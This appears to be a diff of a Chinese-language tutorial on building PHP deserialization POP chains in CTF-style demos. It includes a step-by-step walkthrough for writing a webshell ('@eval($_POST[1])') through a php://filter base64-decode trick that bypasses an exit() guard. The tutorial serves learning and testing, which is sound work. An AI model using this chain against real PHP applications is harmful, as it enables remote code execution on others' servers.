@@ -44,8 +44,6 @@ __wakeup
 
  
 
- 
-
 ```php
 <?php
 
@@ -228,7 +226,7 @@ __get
 
 3. 对于`__toString`函数会返回show类里面的数组`str`,这个数组里面的键值被赋值为source，如果source是一个不可访问的或者不存在的属性,就可以调用被访问类的`__get`魔术函数,那我们就可以将source的值赋值为Test类
 
-4. 此时我们调用了`__get`函数,会将Test类中定义的p赋值给​function,这时看到Read类中存在__invoke魔术方法,而__get函数最后会将function以函数的方式输出,那此时function的值被赋值为Read类,就可以调用Read类中的`__invoke`魔术方法
+4. 此时我们调用了`__get`函数,会将Test类中定义的p赋值给function,这时看到Read类中存在__invoke魔术方法,而__get函数最后会将function以函数的方式输出,那此时function的值被赋值为Read类,就可以调用Read类中的`__invoke`魔术方法
 
 5. 当调用`__invoke`方法时,`$content = $this->file_get($this->var);`将此类中var的值当做参数传入file_get函数中,这里只要控制`$var=flag.php`就可以利用file_get函数中的`file_get_contents`函数读取flag.php文件
 
@@ -246,15 +244,9 @@ unserialize函数->__wakeup魔术方法->toString魔术方法->__get魔术方法
 
  
 
-Exp:
-
- 
-
-![img](http://47.93.248.221/wp-content/uploads/2021/05/pop%E9%93%BE%E6%9E%84%E9%80%A03217.png)
-
 以上是我对这条pop链的理解,可能比较浅显或者不准确,这里附上网上的讲解
 
- 
+
 
 1. 很明显此题考查PHP反序列化构造POP链，遇到此类题型首先寻找可以读取文件的函数，再去寻找可以互相触发从而调用的魔术方法，最终形成一条可以触发读取文件函数的POP链。
 
@@ -416,51 +408,51 @@ Getflag类:
 
 题目让我们get一个参数string,然后将这个值进行反序列化
 
-1. ```
-   既然要反序列化,那就肯定会调用__destruct函数，于是会就从这里开始
-   ```
+```
+既然要反序列化,那就肯定会调用__destruct函数，于是会就从这里开始
+```
 
-   
 
-2. ```
-   从`__destruct`函数来看要调用到Call类中的test1()函数,那可以考虑将$mod1=new Call(),但是怎么实现这一操作呢,我们可以在exp中利用`__construct`魔术方法,在destruct前面添加
-   ```
 
-   
+```
+从`__destruct`函数来看要调用到Call类中的test1()函数,那可以考虑将$mod1=new Call(),但是怎么实现这一操作呢,我们可以在exp中利用`__construct`魔术方法,在destruct前面添加
+```
 
-   ```
-   public function __construct(){
-   
-   	$mod1=new Call();
-   
-   }
-   ```
 
-   
 
-3. ```
-   这里就到了Call类的test1()函数了,继续观察,test1()要将Call类的$mod1赋值为test2(),纵观全篇代码,没有找到test2()这个函数,但是却观察到了funct类中有__call,那么如果我的$mod=new funct()的话我就可以去调用funct类中的__call方法
-   ```
+```
+public function __construct(){
 
-   
+	$mod1=new Call();
 
-4. ```
-   这里我们已经跳到了__call函数了,将funct类中$mod1的值赋值给$s1，再将$s1以函数形式输出,这让我想到了__invoke魔术函数,找一找有没有,看到__invoke函数,我控制变量$s1=new func(),就可以调用func类中的__invoke函数了
-   ```
+}
+```
 
-   
 
-5. ```
-   从__invoke函数继续起跳,$this->mod2 = "字符串拼接".$this->mod1;很明显可以想到如果控制mod1为对象就可以调用__toString函数,再看__toString存在于string1类中
-   ```
 
-   
+```
+这里就到了Call类的test1()函数了,继续观察,test1()要将Call类的$mod1赋值为test2(),纵观全篇代码,没有找到test2()这个函数,但是却观察到了funct类中有__call,那么如果我的$mod=new funct()的话我就可以去调用funct类中的__call方法
+```
 
-6. ```
-   从__toString函数代码来看,只要srt1是实例化对象Getflag就可以调用里面的函数get_flag了
-   ```
 
-   
+
+```
+这里我们已经跳到了__call函数了,将funct类中$mod1的值赋值给$s1，再将$s1以函数形式输出,这让我想到了__invoke魔术函数,找一找有没有,看到__invoke函数,我控制变量$s1=new func(),就可以调用func类中的__invoke函数了
+```
+
+
+
+```
+从__invoke函数继续起跳,$this->mod2 = "字符串拼接".$this->mod1;很明显可以想到如果控制mod1为对象就可以调用__toString函数,再看__toString存在于string1类中
+```
+
+
+
+```
+从__toString函数代码来看,只要srt1是实例化对象Getflag就可以调用里面的函数get_flag了
+```
+
+
 
  
 
@@ -688,8 +680,6 @@ __get
 
  
 
- 
-
 先分析代码,看到了一个用户自定义函数append,作用是包含$var，那$var可控的,当是文件的时候就可以包含文件,也可以用php伪协议
 
  
@@ -711,20 +701,6 @@ __get
 ```
 
  
-
-Exp
-
-贴一个自己写脚本
-
-![img](http://47.93.248.221/wp-content/uploads/2021/05/pop%E9%93%BE%E6%9E%84%E9%80%A08660.png)
-
- 
-
-附上网上的脚本
-
-![img](http://47.93.248.221/wp-content/uploads/2021/05/pop%E9%93%BE%E6%9E%84%E9%80%A08671.png)
-
-注:这里写错了个地方,最后序列化时必须要用urlencode不然protected属性的%00会造成00截断
 
 # **demo4**
 
@@ -847,7 +823,7 @@ echo urlencode($p);
 
 ```
 
- 
+
 
 # **Demo5**
 
@@ -1158,229 +1134,227 @@ B::save()->set()->getExpireTime()和getCacheKey()+serialize()->file_put_contents
 
 回到代码正式开始
 
+```
+1. 从__destruct出发,要触发save()函数,就有这个判断
+
+if (!$this->autosave)
+
+很显然类中不存在autosave变量,这个变量我们可控
+
+直接$this->autosave=false进入if调用save函数
+
+2. 跟进save()
+
+  public function save() {
+
+    $contents = $this->getForStorage();
+
  
 
-1. ```
-   1. 从__destruct出发,要触发save()函数,就有这个判断
-   
-   if (!$this->autosave)
-   
-   很显然类中不存在autosave变量,这个变量我们可控
-   
-   直接$this->autosave=false进入if调用save函数
-   
-   2. 跟进save()
-   
-     public function save() {
-   
-   ​    $contents = $this->getForStorage();
-   
-    
-   
-   ​    $this->store->set($this->key, $contents, $this->expire);
-   
-     }
-   
-   A类并没有set函数,而B类却又并且store可控,那就可以调用B类中的set函数,再看set函数中的参数：
-   
-   $this->key和$this->expire是创建类时定义的参数
-   
-   $contents是调用了getForStorage()得到的
-   
-   3. 回溯getForStorage()函数
-   
-     public function getForStorage() {
-   
-   ​    $cleaned = $this->cleanContents($this->cache);
-   
-    
-   
-   ​    return json_encode([$cleaned, $this->complete]);
-   
-     }
-   
-    
-   
-   又调用了cleanContents()函数
-   
-   并且json_encode一个数组
-   
-   这里需要传入一个数组$this->cache=array()进去cleanContents,为空即可
-   
-   然后把$this->complete进行base64编码绕过json_encode,因为json格式的字符都不满足base64编码的要求
-   
-   4. 跟进set函数
-   
-   public function set($name, $value, $expire = null): bool{
-   
-   ​    $this->writeTimes++;
-   
-    
-   
-   ​    if (is_null($expire)) {
-   
-   ​      $expire = $this->options['expire'];
-   
-   ​    }
-   
-    
-   
-   ​    $expire = $this->getExpireTime($expire);
-   
-   ​    $filename = $this->getCacheKey($name);
-   
-   ​    $dir = dirname($filename);
-   
-   ​    if (!is_dir($dir)) {
-   
-   ​      try {
-   
-   ​        mkdir($dir, 0755, true);
-   
-   ​      } catch (\Exception $e) {
-   
-           // 创建失败
-   
-         }
-   
-       }
-   
-       $data = $this->serialize($value);
-   
-       if ($this->options['data_compress'] && function_exists('gzcompress')) {
-   
-         //数据压缩
-   
-         $data = gzcompress($data, 3);
-   
-       }
-   
-       $data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
-   
-       $result = file_put_contents($filename, $data);
-   
-       if ($result) {
-   
-         return true;
-   
-       }
-   
-       return false;
-   
-     }
-   
-   调用了两个函数getExpireTime()和getCacheKey()
-   
-   跟进这两个函数看看
-   
-   protected function getExpireTime($expire): int {
-   
-       return (int) $expire;
-   
-     }
-   
-    
-   
-     public function getCacheKey(string $name): string {
-   
-       return $this->options['prefix'] . $name;
-   
-     }
-   
-   返回int类型的$expire
-   
-   返回一个拼接字符串,并且$this->options[‘prefix’]可控
-   
-   那么filename就是一个拼接字符串了
-   
-   继续往下看$data=$this->serialize($value)调用了此类中定义的serialize函数
-   
-   跟进看看
-   
-   protected function serialize($data): string {
-   
-       if (is_numeric($data)) {
-   
-         return (string) $data;
-   
-       }
-   
-    
-   
-       $serialize = $this->options['serialize'];
-   
-       return $serialize($data);
-   
-     }
-   
-   $this->options[‘serialize’]可控,并且是以函数形式返回的,那想起之前绕过json_encode进行的base64编码在这里可以解码了
-   
-   $this->options[‘serialize’]=’base64_decode’
-   
-   继续审计代码
-   
-   if ($this->options['data_compress'] && function_exists('gzcompress')) {
-   
-         //数据压缩
-   
-         $data = gzcompress($data, 3);
-   
-       }
-   
-   这里有个压缩数据但是我们并不需要于是把
-   
-   $this->options[‘data_conpress’]=false绕过if
-   
-   终于来到了最后一个data
-   
-   $data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
-   
-   <?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n
-   
-   这串代码就算我们写入了后门但是有个exit()程序依旧不会执行
-   
-   但是由于<、?、()、;、>、\n都不是base64编码的范围，所以base64解码的时候会自动将其忽略，所以解码之后就剩php//exit了
-   
-   不过base64算法解码时是4个字节一组，所以我们还需要在前面加个字符
-   
-   不急慢慢来
-   
-   中间部分sprintf('%012d', $expire)代表12个字节
-   
-   然后我们base64解码后只剩的php//exit有9个字节,总共还有21个字节,为了解码后不影响我们写入的webshell,我们还需要加3个字节
-   
-   由于filename是拼接的字符串$this->options['prefix'] . $name,所以我们可以利用php://filter过滤器写文件
-   
-   $this->options[‘prefix’]=’php://filter/write=convert.base64-decode/resource=’
-   
-   这样我们的filename就是php://filter/write=convert.base64-decode/resource=shell.php
-   
-   对写入的shell进行解码就只有php//exit了
-   
-   但是$data是拼接的字符串
-   
-   $data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
-   
-    
-   
-   所以后面的$data就是我们的webshell
-   
-   来自于经过serialize函数处理后的$contents
-   
-   现在对$contents进行构造了
-   
-   $this->cache=array()
-   
-   $this->complete=base64_encode(‘123’.base64_encode(‘<?php @eval($_POST[1]);?>’))
-   
-   第一个base64编码是为了绕过json_encode
-   
-   第二个base64编码是为了防止php://filter过滤器对写入后面造成过滤处理
-   
-    
-   ```
+    $this->store->set($this->key, $contents, $this->expire);
 
-   
+  }
+
+A类并没有set函数,而B类却又并且store可控,那就可以调用B类中的set函数,再看set函数中的参数：
+
+$this->key和$this->expire是创建类时定义的参数
+
+$contents是调用了getForStorage()得到的
+
+3. 回溯getForStorage()函数
+
+  public function getForStorage() {
+
+    $cleaned = $this->cleanContents($this->cache);
+
+ 
+
+    return json_encode([$cleaned, $this->complete]);
+
+  }
+
+ 
+
+又调用了cleanContents()函数
+
+并且json_encode一个数组
+
+这里需要传入一个数组$this->cache=array()进去cleanContents,为空即可
+
+然后把$this->complete进行base64编码绕过json_encode,因为json格式的字符都不满足base64编码的要求
+
+4. 跟进set函数
+
+public function set($name, $value, $expire = null): bool{
+
+    $this->writeTimes++;
+
+ 
+
+    if (is_null($expire)) {
+
+      $expire = $this->options['expire'];
+
+    }
+
+ 
+
+    $expire = $this->getExpireTime($expire);
+
+    $filename = $this->getCacheKey($name);
+
+    $dir = dirname($filename);
+
+    if (!is_dir($dir)) {
+
+      try {
+
+        mkdir($dir, 0755, true);
+
+      } catch (\Exception $e) {
+
+        // 创建失败
+
+      }
+
+    }
+
+    $data = $this->serialize($value);
+
+    if ($this->options['data_compress'] && function_exists('gzcompress')) {
+
+      //数据压缩
+
+      $data = gzcompress($data, 3);
+
+    }
+
+    $data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
+
+    $result = file_put_contents($filename, $data);
+
+    if ($result) {
+
+      return true;
+
+    }
+
+    return false;
+
+  }
+
+调用了两个函数getExpireTime()和getCacheKey()
+
+跟进这两个函数看看
+
+protected function getExpireTime($expire): int {
+
+    return (int) $expire;
+
+  }
+
+ 
+
+  public function getCacheKey(string $name): string {
+
+    return $this->options['prefix'] . $name;
+
+  }
+
+返回int类型的$expire
+
+返回一个拼接字符串,并且$this->options[‘prefix’]可控
+
+那么filename就是一个拼接字符串了
+
+继续往下看$data=$this->serialize($value)调用了此类中定义的serialize函数
+
+跟进看看
+
+protected function serialize($data): string {
+
+    if (is_numeric($data)) {
+
+      return (string) $data;
+
+    }
+
+ 
+
+    $serialize = $this->options['serialize'];
+
+    return $serialize($data);
+
+  }
+
+$this->options[‘serialize’]可控,并且是以函数形式返回的,那想起之前绕过json_encode进行的base64编码在这里可以解码了
+
+$this->options[‘serialize’]=’base64_decode’
+
+继续审计代码
+
+if ($this->options['data_compress'] && function_exists('gzcompress')) {
+
+      //数据压缩
+
+      $data = gzcompress($data, 3);
+
+    }
+
+这里有个压缩数据但是我们并不需要于是把
+
+$this->options[‘data_conpress’]=false绕过if
+
+终于来到了最后一个data
+
+$data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
+
+<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n
+
+这串代码就算我们写入了后门但是有个exit()程序依旧不会执行
+
+但是由于<、?、()、;、>、\n都不是base64编码的范围，所以base64解码的时候会自动将其忽略，所以解码之后就剩php//exit了
+
+不过base64算法解码时是4个字节一组，所以我们还需要在前面加个字符
+
+不急慢慢来
+
+中间部分sprintf('%012d', $expire)代表12个字节
+
+然后我们base64解码后只剩的php//exit有9个字节,总共还有21个字节,为了解码后不影响我们写入的webshell,我们还需要加3个字节
+
+由于filename是拼接的字符串$this->options['prefix'] . $name,所以我们可以利用php://filter过滤器写文件
+
+$this->options[‘prefix’]=’php://filter/write=convert.base64-decode/resource=’
+
+这样我们的filename就是php://filter/write=convert.base64-decode/resource=shell.php
+
+对写入的shell进行解码就只有php//exit了
+
+但是$data是拼接的字符串
+
+$data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
+
+ 
+
+所以后面的$data就是我们的webshell
+
+来自于经过serialize函数处理后的$contents
+
+现在对$contents进行构造了
+
+$this->cache=array()
+
+$this->complete=base64_encode(‘123’.base64_encode(‘<?php @eval($_POST[1]);?>’))
+
+第一个base64编码是为了绕过json_encode
+
+第二个base64编码是为了防止php://filter过滤器对写入后面造成过滤处理
+
+ 
+```
+
+
 
 贴exp
 
@@ -1439,5 +1413,7 @@ echo urlencode(serialize($a));
 ```
 
  
+
+写在最后，这篇文章是很早之前写的了，部分exp找不到了，也很简单，就只贴几个入门的demo加上部分分析吧
 
  
